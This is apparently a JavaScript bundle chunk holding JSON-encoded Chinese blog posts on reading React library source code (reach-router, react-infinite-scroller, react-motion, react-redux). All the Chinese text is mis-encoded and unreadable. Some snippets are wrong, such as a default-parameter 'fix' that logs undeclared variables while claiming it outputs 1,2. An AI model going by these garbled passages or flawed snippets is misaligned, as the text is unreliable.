è¿™é‡ŒRedirectæ˜¯ä¸ªæ— çŠ¶æ€ç»„ä»¶  </span>\\n<span class=\\"hljs-keyword\\">let</span> Redirect = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">props</span> =&gt;</span> (\\n  &lt;Location&gt;\\n    {locationContext =&gt; &lt;RedirectImpl {...locationContext} {...props} /&gt;}\\n  &lt;/Location&gt;\\n);</code></pre></code></pre>\\n","toc":[{"anchor":"popstate","level":2,"text":"popstate"},{"anchor":"ti-dai-pushstate-he-replacestate","level":2,"text":"æ›¿ä»£pushStateå’ŒreplaceState"},{"anchor":"createcontextdefaultvalue","level":2,"text":"createContext(defaultValue)"},{"anchor":"gong-ju-jie-shao--invariant","level":2,"text":"å·¥å…·ä»‹ç» invariant"},{"anchor":"react-zhong-elementtype","level":2,"text":"reactä¸­element.type"}],"relatedTags":null,"created_at":"2018-07-05","timeArr":[2018,6,5,0,0,0,0],"title":"æºç é˜…è¯»-reach-routeræºç å­¦ä¹ åˆ°çš„1","uuid":"7b0adb17281c68e7822dafdd8044bb001e43c5ee","summary":"<h4>popstate</h4>\\n<p>åªåœ¨æµè§ˆå™¨ä¸‹å‰è¿›åé€€å’Œæ”¹å˜hashè§¦å‘ï¼Œ<code>pushState</code>å’Œ<code>replaceState</code>å¹¶ä¸ä¼šè§¦å‘</p>\\n<p>æºç ä¸­ç»™<code>popstate</code>å’Œ<code>navigate</code>äº‹ä»¶ç»‘å®šäº†ä¸€æ—¦æ‰§è¡Œå°±æ›´æ–°å½“å‰location(ä¼ é€’åˆ°contextä¸­çš„)</p>\\n<h4>æ›¿ä»£pushStateå’ŒreplaceState</h4>\\n<p>æºç ...</p>","slug":"yuan-ma-yue-du-reach-router-yuan-ma-xue-xi-dao-de-1","sha":"7e151f2405bca2a2f40f41defe20c8dc037ac39e"}')},671:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"lu-jing-pi-pei-you-xian-quan-wen-ti\\">è·¯å¾„åŒ¹é…ä¼˜å…ˆæƒé—®é¢˜</h2>\\n<p>å…ˆå‡è®¾ä¸€ä¸ªé—®é¢˜ï¼š</p>\\n<p>æœ‰ä¸€ä¸ªåŒ¹é…è·¯å¾„ï¼š <code>doc/artical</code></p>\\n<p>å¾…åŒ¹é…è·¯å¾„æœ‰3ä¸ªï¼š</p>\\n<p><code>doc/:section</code></p>\\n<p><code>doc/*</code></p>\\n<p><code>doc/artical</code></p>\\n<p>è¯¥ä¼˜å…ˆå¯¹å“ªä¸ªåŒ¹é…å‘¢ï¼Ÿ</p>\\n<p>æºç ä¸­æ˜¯ä½¿ç”¨äº†ä¸€ä¸ªè¯„åˆ†çš„æ–¹æ³•ï¼š</p>\\n<ul>\\n<li>å…ˆå¯¹è·¯å¾„å»é™¤å¤´å°¾çš„&quot;/&quot; ï¼Œå¹¶ä¸”æŒ‰&quot;/&quot;åˆ†å‰²æˆè·¯å¾„ç‰‡æ®µæ•°ç»„</li>\\n<li>å¯¹æ•°ç»„ä½¿ç”¨reduceæ–¹æ³•è®¡ç®—åˆ†å€¼ï¼Œå¦‚ä¸‹ï¼š<pre><code><pre class=\\"hljs\\"><code>let SEGMENT_POINTS = 4;     // åŸºæœ¬åˆ†å€¼ï¼Œæ¯ä¸€ä¸ªè·¯å¾„ç‰‡æ®µéƒ½æœ‰\\nlet STATIC_POINTS = 3;      // é™æ€è·¯å¾„ï¼Œå¦‚ï¼š/abc\\nlet DYNAMIC_POINTS = 2;     // åŠ¨æ€è·¯å¾„ï¼Œå¦‚ï¼š/:section\\nlet SPLAT_PENALTY = 1;      // é€šé…ç¬¦ï¼ˆå‡åˆ†ï¼‰ï¼Œå¦‚ï¼š/*ï¼Œæ­¤å¤„é‡åˆ°é€šé…ç¬¦ä¼šå…ˆå‡å»åŸºæœ¬åˆ†å€¼ï¼Œå†å‡1åˆ†ï¼ˆä¼˜å…ˆæƒå¾ˆä½ï¼‰\\nlet ROOT_POINTS = 1;        // æ ¹è·¯å¾„</code></pre></code></pre>å¯çŸ¥ä¼˜å…ˆæƒæ’åºä¸ºï¼š</li>\\n</ul>\\n<p>é™æ€è·¯å¾„ &gt; åŠ¨æ€è·¯å¾„ &gt; æ ¹è·¯å¾„ &gt; é€šé…ç¬¦</p>\\n<p>å› æ­¤ä¸Šé¢çš„é—®é¢˜ä¼šä¼˜å…ˆåŒ¹é…<code>doc/artical</code>ï¼Œç¬¬äºŒæœ‰ä¼˜å…ˆåº¦ä¸º<code>doc/:section</code></p>\\n","toc":[{"anchor":"lu-jing-pi-pei-you-xian-quan-wen-ti","level":2,"text":"è·¯å¾„åŒ¹é…ä¼˜å…ˆæƒé—®é¢˜"}],"relatedTags":null,"created_at":"2018-07-06","timeArr":[2018,6,6,0,0,0,0],"title":"æºç é˜…è¯»-reach-routeræºç å­¦ä¹ åˆ°çš„2","uuid":"cc5d864eab97f30e3cb11aff77b2ac5a7ad4ed86","summary":"<h4>è·¯å¾„åŒ¹é…ä¼˜å…ˆæƒé—®é¢˜</h4>\\n<p>å…ˆå‡è®¾ä¸€ä¸ªé—®é¢˜ï¼š</p>\\n<p>æœ‰ä¸€ä¸ªåŒ¹é…è·¯å¾„ï¼š <code>doc/artical</code></p>\\n<p>å¾…åŒ¹é…è·¯å¾„æœ‰3ä¸ªï¼š</p>\\n<p><code>doc/:section</code></p>\\n<p><code>doc/*</code></p>\\n<p><code>doc/artical</code></p>\\n<p>è¯¥ä¼˜å…ˆå¯¹å“ªä¸ªåŒ¹é…å‘¢ï¼Ÿ</p>\\n<p>æºç ä¸­æ˜¯ä½¿ç”¨äº†ä¸€ä¸ªè¯„åˆ†çš„æ–¹æ³•ï¼š</p>\\n<ul>\\n<li>å…ˆå¯¹è·¯å¾„å»é™¤å¤´å°¾çš„&quot;/&quot; ï¼Œå¹¶ä¸”æŒ‰&quot;/&quot;åˆ†å‰²æˆè·¯å¾„ç‰‡æ®µæ•°ç»„\\n...</li>\\n</ul>","slug":"yuan-ma-yue-du-reach-router-yuan-ma-xue-xi-dao-de-2","sha":"a36a3611a3b4eab9e4d4f48583424f9a869764b8"}')},672:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"guan-yu-consumer-de-bu-chong\\">å…³äºConsumerçš„è¡¥å……</h2>\\n<p>å®˜æ–¹ï¼ˆè‹±æ–‡ï¼‰ï¼š</p>\\n<blockquote>\\n<p>All Consumers that are descendants of a Provider will re-render whenever the Providerâ€™s value prop changes. \\nThe propagation from Provider to its descendant Consumers is not subject to the shouldComponentUpdate method, \\nso the Consumer is updated even when an ancestor component bails out of the update.</p>\\n</blockquote>\\n<blockquote>\\n<p>Changes are determined by comparing the new and old values using the same algorithm as Object.is.</p>\\n</blockquote>\\n<p>å¤§æ¦‚ç¿»è¯‘ï¼š</p>\\n<p>æ¯å½“ Provider çš„valueå‘ç”Ÿæ”¹å˜æ—¶ï¼Œå…¶å†…éƒ¨æ‰€æœ‰çš„ Consumers éƒ½å°†ä¼šé‡æ–°æ¸²æŸ“ã€‚è¿™ç§æ”¹å˜ä¸ä¼šå—åˆ°shouldComponentUpdateæ–¹æ³•å½±å“ï¼Œ\\nå› æ­¤å³ä½¿ç»„ä»¶å–æ¶ˆäº†æ›´æ–°ï¼Œä½†æ˜¯Consumerè¿˜æ˜¯ä¼šç»§ç»­æ¸²æŸ“ã€‚</p>\\n<p>Consumeræ˜¯é€šè¿‡ä½¿ç”¨ç›¸åŒçš„ç®—æ³•å¦‚Object.isæ¯”è¾ƒæ–°æ—§å€¼æ¥ç¡®å®šå˜åŒ–ã€‚</p>\\n<hr>\\n<p>è¿™ä¸ªç‰¹æ€§åœ¨æºç ä¸­è¿™ä¹ˆä½“ç°ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>let Location = ({ children }) =&gt; (\\n\\n  &lt;LocationContext.Consumer&gt;\\n    {context =&gt;\\n      context ? (\\n      // åé¢ç»§ç»­åˆ›å»ºæ—¶ï¼ˆåµŒå¥—ï¼‰ï¼Œcontextä¼šåŠ¨æ€éšç€çˆ¶çº§çš„Provideræ›´æ–°ï¼Œå› æ­¤ç›´æ¥è°ƒç”¨children\\n        children(context)\\n      ) : (\\n      // ç¬¬ä¸€æ¬¡åˆ›å»ºæ—¶ context æ— å€¼ï¼Œåˆ›å»º LocationProvider\\n        &lt;LocationProvider&gt;{children}&lt;/LocationProvider&gt;\\n      )\\n    }\\n  &lt;/LocationContext.Consumer&gt;\\n);</code></pre></code></pre><p>è¿™ä¸ªLocationç»„ä»¶è¿”å›å€¼æ˜¯ä¸€ä¸ª<code>createContext(/* æ— å‚æ•°*/)</code>çš„<code>Consumer</code>ï¼Œå½“ä½¿ç”¨ç»„ä»¶æ—¶<code>Router/Link/Redirect/Match</code>ï¼Œå®ƒéƒ½åœ¨å†…éƒ¨ã€‚</p>\\n<p>å› æ­¤ç¬¬ä¸€æ¬¡åˆ›å»ºåœ¨<code>Routerç»„ä»¶</code>å†…éƒ¨çš„æ—¶å€™ï¼Œ<code>context</code>æ˜¯undefinedï¼Œä¼šåˆ›å»º<code>LocationProviderç»„ä»¶</code>ï¼Œ\\nLocationProviderç»„ä»¶å°±æ˜¯å¯¹åº”çš„<code>Provider</code>ï¼Œå¹¶ä¸”å†…éƒ¨ä¼šè·å–åˆ°å…¬å…±ä½¿ç”¨çš„è·³è½¬æ–¹æ³•<code>navigate</code>å’Œå½“å‰urlçš„ä¿¡æ¯<code>location</code>ä½œä¸ºå®ƒçš„valueã€‚</p>\\n<p>è€Œå½“<code>Route Component</code>å†…éƒ¨ç»§ç»­åµŒå¥—<code>Router</code>çš„æ—¶å€™ï¼Œcontextä¼šè·å–åˆ°<code>Provider</code>çš„valueå€¼ï¼Œå› æ­¤ç›´æ¥è°ƒç”¨<code>children(context)</code></p>\\n<p>ç»“æ„å¦‚ä¸‹ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>class App extends Component{\\n    /*...*/\\n    return (\\n        // æœ€å¤–å±‚çš„Locationï¼Œåˆ›å»º LocationProviderç»„ä»¶\\n        &lt;Router&gt;\\n            &lt;Home path=&quot;...&quot; /&gt;\\n            &lt;Details path=&quot;...&quot;  /&gt;\\n        &lt;/Router&gt;\\n    )\\n}\\n\\nclass Details extends Component{\\n    /*...*/\\n    return (\\n        // åµŒå¥—çš„Locationï¼Œç›´æ¥è°ƒç”¨children(context)\\n        // è¿™é‡Œchildrenæ˜¯ä¸€ä¸ªå‚æ•°æ˜¯contextçš„å‡½æ•°\\n        &lt;Link to=&quot;...&quot; &gt;Details-1&lt;/Link&gt;\\n    )\\n}</code></pre></code></pre><h2 id=\\"promiseresolvethen\\">Promise.resolve().then</h2>\\n<p>æºç ä¸­çœ‹åˆ°è¿™ç§è¯­å¥ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>Promise.resolve().then(() =&gt; {\\n      navigate(insertParams(to, props), { replace, state });\\n    });</code></pre></code></pre><p>ä¹‹å‰å¹¶æœªè§è¿‡ï¼Œè§‰å¾—è¿™ä¸å°±æ˜¯ä¸ªPromiseç«‹å³å®Œæˆçš„å¼‚æ­¥å—ï¼Œä¸ºä»€ä¹ˆä¸ä½¿ç”¨<code>setTimeout(()=&gt;{},0)</code>ï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>setTimeout(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">1</span>)\\n},<span class=\\"hljs-number\\">0</span>);\\n\\n<span class=\\"hljs-built_in\\">Promise</span>.resolve().then(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">2</span>)\\n    });\\n<span class=\\"hljs-comment\\">// 2</span>\\n<span class=\\"hljs-comment\\">// 1</span></code></pre></code></pre>\\n<p>Promiseçš„ä»»åŠ¡ä¼šæ·»åŠ åˆ°å½“å‰ä»»åŠ¡é˜Ÿåˆ—çš„æœ«å°¾ï¼Œè€ŒsetTimeoutä¸­çš„ä»»åŠ¡æ˜¯æ”¾åˆ°ä¸‹ä¸€ä¸ªäº‹ä»¶å¾ªç¯åˆ—è¡¨æ‰§è¡Œ</p>\\n<p>ä¸€å¼ å›¾ç†è§£ï¼š\\n<img src=\\"/article/img/eventloop%20and%20callbackqueue.png\\" alt=\\"\\"></p>\\n<p>ç®€å•æ¥è¯´ï¼ŒPromiseå°±æ˜¯å¼‚æ­¥ï¼Œè¶Šå¿«è¶Šå¥½</p>\\n","toc":[{"anchor":"guan-yu-consumer-de-bu-chong","level":2,"text":"å…³äºConsumerçš„è¡¥å……"},{"anchor":"promiseresolvethen","level":2,"text":"Promise.resolve().then"}],"relatedTags":null,"created_at":"2018-07-07","timeArr":[2018,6,7,0,0,0,0],"title":"æºç é˜…è¯»-reach-routeræºç å­¦ä¹ åˆ°çš„3","uuid":"94269872739a3bce7b949811a96155420826e1bd","summary":"<p>All Consumers that are descendants of a Provider will re-render whenever the Providerâ€™s value prop changes.\\nThe propagation from Provider to its descendant Consumers is not subject to the shouldComponentUpdate method,\\nso the Consumer is updated even when an ancestor component bails out of the update.</p>","slug":"yuan-ma-yue-du-reach-router-yuan-ma-xue-xi-dao-de-3","sha":"d91847cb95128b4df27dc580f59ae7f12b7a6af8"}')},673:function(n){n.exports=JSON.parse('{"content":"<ol>\\n<li><p><code>offsetParent</code></p>\\n<p> <code>offsetParent</code>è¿”å›ä¸€ä¸ªæŒ‡å‘æœ€è¿‘çš„åŒ…å«è¯¥å…ƒç´ çš„å®šä½å…ƒç´ .</p>\\n<p> <code>offsetParent</code>å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºè®¡ç®—<code>offsetTop</code>å’Œ<code>offsetLeft</code>éƒ½æ˜¯ç›¸å¯¹äº<code>offsetParent</code>è¾¹ç•Œçš„ã€‚</p>\\n<p> <code>offsetParent</code>ä¸º null çš„å‡ ç§æƒ…å†µ:</p>\\n<ul>\\n<li><p>ele ä¸º body</p>\\n</li>\\n<li><p>ele çš„ position ä¸º fixed</p>\\n</li>\\n<li><p>ele çš„ display ä¸º none</p>\\n<p>æºç ä¸­<code>offsetParent</code>å¤„ç†äº†2ç§æƒ…å†µ</p>\\n</li>\\n</ul>\\n<ol>\\n<li><p>åœ¨<code>useWindow</code>çš„æƒ…å†µä¸‹(å³äº‹ä»¶ç»‘å®šåœ¨windowï¼Œæ»šåŠ¨ä½œç”¨åœ¨body)</p>\\n<p> é€šè¿‡é€’å½’è·å–<code>offsetParent</code>åˆ°è¾¾é¡¶ç«¯çš„é«˜åº¦(<code>offsetTop</code>)ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>calculateTopPosition(el) {\\n  <span class=\\"hljs-keyword\\">if</span> (!el) {\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-number\\">0</span>;   \\n  }\\n  <span class=\\"hljs-keyword\\">return</span> el.offsetTop + <span class=\\"hljs-keyword\\">this</span>.calculateTopPosition(el.offsetParent);   \\n }</code></pre></code></pre>\\n</li>\\n<li><p>é€šè¿‡åˆ¤æ–­<code>offsetParent</code>ä¸ä¸ºnullçš„æƒ…å†µï¼Œç¡®ä¿æ»šåŠ¨ç»„ä»¶æ­£å¸¸æ˜¾ç¤º</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">if</span> (\\n offset &lt; <span class=\\"hljs-built_in\\">Number</span>(<span class=\\"hljs-keyword\\">this</span>.props.threshold) &amp;&amp;\\n (el &amp;&amp; el.offsetParent !== <span class=\\"hljs-literal\\">null</span>)\\n) {<span class=\\"hljs-comment\\">/* ... */</span> }</code></pre></code></pre>\\n</li>\\n</ol>\\n</li>\\n<li><p><code>scrollHeight</code>å’Œ<code>clientHeight</code></p>\\n<p> åœ¨æ— æ»šåŠ¨çš„æƒ…å†µä¸‹ï¼Œ<code>scrollHeight</code>å’Œ<code>clientHeight</code>ç›¸ç­‰ï¼Œéƒ½ä¸º<code>width</code>+<code>padding</code>*2</p>\\n<p> åœ¨æœ‰æ»šåŠ¨çš„æƒ…å†µä¸‹ï¼Œ<code>scrollHeight</code>è¡¨ç¤ºå®é™…å†…å®¹é«˜åº¦ï¼Œ<code>clientHeight</code>è¡¨ç¤ºè§†å£é«˜åº¦ã€‚</p>\\n</li>\\n<li><p>æ¯æ¬¡æ‰§è¡Œ<code>loadMore</code>å‰å¸è½½äº‹ä»¶ã€‚</p>\\n<p> ç¡®ä¿ä¸ä¼šé‡å¤(è¿‡å¤š)æ‰§è¡Œ<code>loadMore</code>ï¼Œå› ä¸ºå…ˆå¸è½½äº‹ä»¶å†æ‰§è¡Œ<code>loadMore</code>ï¼Œå¯ä»¥ç¡®ä¿åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œ<code>scroll</code>äº‹ä»¶æ˜¯æ— æ•ˆçš„ã€‚</p>\\n<p> ç„¶åå†æ¯æ¬¡<code>didUpdate</code>çš„æ—¶å€™é‡æ–°ç»‘å®šäº‹ä»¶ã€‚</p>\\n</li>\\n<li><p>mousewheelè§£å†³chromeçš„ç­‰å¾…bug</p>\\n<p>æºç ä¸­è®¢é˜…<code>mousewheel</code>äº‹ä»¶æ˜¯ä¸ºäº†å¤„ç†<code>chrome</code>æµè§ˆå™¨çš„ä¸€ä¸ªç‰¹æ€§(ä¸çŸ¥é“æ˜¯å¦æ˜¯ä¸€ç§bug)ã€‚</p>\\n<p><a href=\\"https://stackoverflow.com/questions/47524205/random-high-content-download-time-in-chrome/47684257#47684257\\">stackoverflow:Chromeçš„æ»šåŠ¨ç­‰å¾…é—®é¢˜</a></p>\\n<p>ä¸Šé¢è¿™ä¸ªé—®é¢˜ä¸»è¦æè¿°ï¼Œå½“åœ¨ä½¿ç”¨æ»šè½®åŠ è½½æ—¶ï¼Œè€Œä¸”åŠ è½½ä¼šè§¦å‘<code>ajaxè¯·æ±‚</code>ï¼Œå½“æ»šè½®åˆ°è¾¾åº•éƒ¨ï¼Œä¼šå‡ºç°ä¸€ä¸ªæ¼«é•¿è€Œä¸”æ— ä»»ä½•åŠ¨ä½œçš„ç­‰å¾…(é•¿è¾¾2-3s)ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-built_in\\">window</span>.addEventListener(<span class=\\"hljs-string\\">\\"mousewheel\\"</span>, (e) =&gt; {\\n    <span class=\\"hljs-keyword\\">if</span> (e.deltaY === <span class=\\"hljs-number\\">1</span>) {\\n        e.preventDefault()\\n    }\\n})</code></pre></code></pre>\\n<p>ä»¥ä¸Šç»‘å®šå¯ä»¥æ¶ˆé™¤è¿™ä¸ª&quot;bug&quot;ã€‚</p>\\n</li>\\n</ol>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-25","timeArr":[2018,10,25,0,0,0,0],"title":"æºç é˜…è¯»-react-infinite-scroller-ç¬”è®°","uuid":"e4ce5c4bef01302a0d060390b3bb12ae149f583f","summary":"<ol>\\n<li>\\n<p><code>offsetParent</code></p>\\n<p><code>offsetParent</code>è¿”å›ä¸€ä¸ªæŒ‡å‘æœ€è¿‘çš„åŒ…å«è¯¥å…ƒç´ çš„å®šä½å…ƒç´ .</p>\\n<p><code>offsetParent</code>å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºè®¡ç®—<code>offsetTop</code>å’Œ<code>offsetLeft</code>éƒ½æ˜¯ç›¸å¯¹äº<code>offsetParent</code>è¾¹ç•Œçš„ã€‚</p>\\n<p><code>offsetParent</code>...</p>\\n</li>\\n</ol>","slug":"yuan-ma-yue-du-react-infinite-scroller-bi-ji","sha":"ca1df5a51761dd3bb612a4ab486576a8102d2d1b"}')},674:function(n){n.exports=JSON.parse('{"content":"<p>é˜…è¯»<a href=\\"https://github.com/chenglou/react-motion\\">react-motion</a>çš„æºç æ—¶å€™ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªç»„ä»¶<code>TransitionMotion</code>\\nï¼Œå®ƒè´Ÿè´£å…ƒç´ çš„æ–°å¢å’Œç§»é™¤åŠ¨ç”»ï¼Œå†…éƒ¨æœ‰2ä¸ªæ¦‚å¿µï¼š<code>old</code>å’Œ<code>new</code></p>\\n<hr>\\n<p>è¿™å°±å…ˆè¯´åˆ°æ’åºï¼Œ</p>\\n<p>å½“åŠ¨ç”»é˜Ÿåˆ—å‡ºç°å¦‚ä¸‹çŠ¶æ€æ—¶ï¼Œè¯¥å¦‚ä½•å¤„ç†ï¼š</p>\\n<p>æ—§çš„åºåˆ—ï¼š <code>a -&gt; b -&gt; x</code></p>\\n<p>æ–°çš„åºåˆ—ï¼š <code>c -&gt; b -&gt; d</code></p>\\n<p>è¿™é‡Œæ¶‰åŠåˆ°<code>æ‹“æ‰‘æ’åº</code>çš„æ€æƒ³</p>\\n<ol>\\n<li><p><code>a</code>å’Œ<code>c</code>çš„å…¥å£ç‚¹ä¸º0ï¼Œå› æ­¤ <code>a</code>å’Œ<code>c</code> åœ¨<code>b</code>çš„å‰é¢æ‰§è¡Œï¼Œ</p>\\n</li>\\n<li><p>æ‰§è¡Œå®Œ<code>a</code>å’Œ<code>c</code>åï¼Œ<code>b</code>çš„å…¥å£ç‚¹ä¸º0ï¼Œå› æ­¤<code>b</code>åœ¨ <code>x</code>å’Œ<code>d</code>çš„å‰é¢æ‰§è¡Œï¼Œ</p>\\n</li>\\n<li><p>é‚£ä¹ˆ<code>a</code>å’Œ<code>c</code>çš„é¡ºåºï¼Œ<code>x</code>å’Œ<code>d</code>çš„é¡ºåºæ€ä¹ˆåˆ¤æ–­</p>\\n</li>\\n</ol>\\n<p>å®é™…æ“ä½œæ˜¯ä½¿ç”¨åŸç”Ÿ<code>sort</code>æ–¹æ³•ï¼Œ<code>sort</code>å¯¹æ¯”å‚æ•°åˆ†4ç§æƒ…å†µï¼š</p>\\n<ol>\\n<li>ä¸¤è€…éƒ½åœ¨æ—§åºåˆ—ï¼Œé‚£ä¹ˆå°±æŒ‰æ—§çš„æ’åº</li>\\n<li>ä¸¤è€…éƒ½åœ¨æ–°åºåˆ—ï¼Œé‚£ä¹ˆå°±æŒ‰æ–°çš„æ’åº</li>\\n<li>xåœ¨æ—§ï¼Œyåœ¨æ–°ï¼Œé‚£ä¹ˆæ‰¾xå’Œyçš„ä¸­é—´å€¼ï¼Œä¾‹å¦‚<code>a</code>å’Œ<code>d</code>çš„ä¸­é—´å€¼å°±æ˜¯<code>b</code>ï¼Œç„¶åæ ¹æ®ä¸­é—´å€¼æ’åº</li>\\n<li>xåœ¨æ—§ï¼Œyåœ¨æ–°ï¼Œæ— ä¸­é—´å€¼ï¼Œé‚£ä¹ˆæŒ‰ç…§æ—§åºåˆ—ä¼˜å…ˆï¼Œå³<code>a-&gt;c</code>ï¼Œ<code>x-&gt;d</code></li>\\n</ol>\\n<hr>\\n<p>é€šè¿‡æ’åºä¹Ÿå®šä¹‰äº†å†…éƒ¨çš„newå’Œoldçš„åŒºåˆ«ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>* oldä»£è¡¨æœªæ’åºçš„åŠ¨ç”»åˆ—è¡¨æˆ–è€…æ•°æ®\\nä¾‹å¦‚ï¼šoldMergedPropsStyleså°±æ˜¯æœªæ’åºçš„mergedPropsStyles\\noldMergedPropsStyles\\noldCurrentStyles\\noldCurrentVelocities\\noldLastIdealStyles\\noldLastIdealVelocities\\n----------------------------\\n* newä»£è¡¨å·²ç»æ’åºçš„åŠ¨ç”»åˆ—è¡¨æˆ–è€…æ•°æ®\\nä¾‹å¦‚ï¼šnewMergedPropsStyleså°±æ˜¯å·²ç»æ’å¥½åºçš„mergedPropsStyles\\nnewMergedPropsStyles, \\nnewCurrentStyles, \\nnewCurrentVelocities, \\nnewLastIdealStyles, \\nnewLastIdealVelocities</code></pre></code></pre><p>æ›´è¯¦ç»†æŸ¥çœ‹[react-motionæºç é˜…è¯»]</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-10","timeArr":[2018,7,10,0,0,0,0],"title":"æºç é˜…è¯»-react-motion-æ‹“æ‰‘æ’åºæ€æƒ³","uuid":"f616d21af7026eb71d6d96d1e0adfc13871af644","summary":"<h4>é˜…è¯»<a href=\\"https://github.com/chenglou/react-motion\\">react-motion</a>çš„æºç æ—¶å€™ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªç»„ä»¶<code>TransitionMotion</code>\\nï¼Œå®ƒè´Ÿè´£å…ƒç´ çš„æ–°å¢å’Œç§»é™¤åŠ¨ç”»ï¼Œå†…éƒ¨æœ‰2ä¸ªæ¦‚å¿µï¼š<code>old</code>å’Œ<code>new</code></h4>\\n<p>è¿™å°±å…ˆè¯´åˆ°æ’åºï¼Œ</p>\\n<p>å½“åŠ¨ç”»é˜Ÿåˆ—å‡ºç°å¦‚ä¸‹çŠ¶æ€...</p>","slug":"yuan-ma-yue-du-react-motion-tuo-pu-pai-xu-si-xiang","sha":"65c59ec0ce44ba503eeb5cfdeec3d1eba9b70047"}')},675:function(n){n.exports=JSON.parse('{"content":"<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">myFunc</span>(<span class=\\"hljs-params\\">{x=<span class=\\"hljs-number\\">1</span>,y=<span class=\\"hljs-number\\">2</span>}</span>)</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(x,y)  \\n  <span class=\\"hljs-comment\\">// ...</span>\\n}\\nmyFunc({})      <span class=\\"hljs-comment\\">// x:1,y:2</span>\\nmyFunc()        <span class=\\"hljs-comment\\">// æŠ¥é”™</span>\\nmyFunc(<span class=\\"hljs-literal\\">null</span>)    <span class=\\"hljs-comment\\">// æŠ¥é”™</span></code></pre></code></pre>\\n<p>ä¸ä¼ å‚æ•°ï¼Œåˆ™ä»<code>undefined</code>é‡Œé¢æŸ¥æ‰¾xå’Œyå±æ€§ï¼ŒæŠ¥é”™ã€‚</p>\\n<p>ä¿®æ­£1 ï¼š(å¯ä»¥è‡ªè¡Œè°ƒæ•´æ˜¯å¦æ”¯æŒnull)</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">myFunc</span>(<span class=\\"hljs-params\\">obj</span>)</span>{\\n  <span class=\\"hljs-keyword\\">if</span>(obj===<span class=\\"hljs-literal\\">null</span>)<span class=\\"hljs-keyword\\">throw</span> <span class=\\"hljs-built_in\\">Error</span>()\\n  <span class=\\"hljs-keyword\\">let</span> finalObj=<span class=\\"hljs-built_in\\">Object</span>.assign({<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>},obj)\\n  <span class=\\"hljs-built_in\\">console</span>.log(x,y)\\n  <span class=\\"hljs-comment\\">// ...</span>\\n}\\nmyFunc({})          <span class=\\"hljs-comment\\">// x:1,y:2</span>\\nmyFunc()            <span class=\\"hljs-comment\\">// x:1,y:2</span>\\nmyFunc({<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">5</span>})   <span class=\\"hljs-comment\\">// x:2,y:2</span>\\nmyFunc(<span class=\\"hljs-literal\\">null</span>)       <span class=\\"hljs-comment\\">// æŠ¥é”™</span></code></pre></code></pre>\\n<p>ä¿®æ­£2 ï¼šä¸æ”¯æŒnull</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">myFunc</span>(<span class=\\"hljs-params\\">{x=<span class=\\"hljs-number\\">1</span>,y=<span class=\\"hljs-number\\">2</span>}={}</span>)</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(x,y)  \\n  <span class=\\"hljs-comment\\">// ...</span>\\n}\\nmyFunc({})          <span class=\\"hljs-comment\\">// x:1,y:2</span>\\nmyFunc()            <span class=\\"hljs-comment\\">// x:1,y:2</span>\\nmyFunc({<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">5</span>})   <span class=\\"hljs-comment\\">// x:2,y:2</span>\\nmyFunc(<span class=\\"hljs-literal\\">null</span>)       <span class=\\"hljs-comment\\">// æŠ¥é”™</span></code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-18","timeArr":[2018,10,18,0,0,0,0],"title":"æºç é˜…è¯»-react-redux-å‚æ•°ä¸ºobjçš„é»˜è®¤å‚æ•°å†™æ³•","uuid":"42b4b2b7669e8fdbc1cd63d0eb42e60b98c48f8e","summary":"<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">myFunc</span>(<span class=\\"hljs-params\\">{x=<span class=\\"hljs-number\\">1</span>,y=<span class=\\"hljs-number\\">2</span>}</span>)</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(x,y)  \\n  <span class=\\"hljs-comment\\">// ...</span>\\n}\\nmyFunc({})      <span class=\\"hljs-comment\\">// x:1,y:2</span>\\nmyFunc()        <span class=\\"hljs-comment\\">// æŠ¥é”™</span>\\nmyFunc(<span class=\\"hljs-literal\\">null</span>)    <span class=\\"hljs-comment\\">// 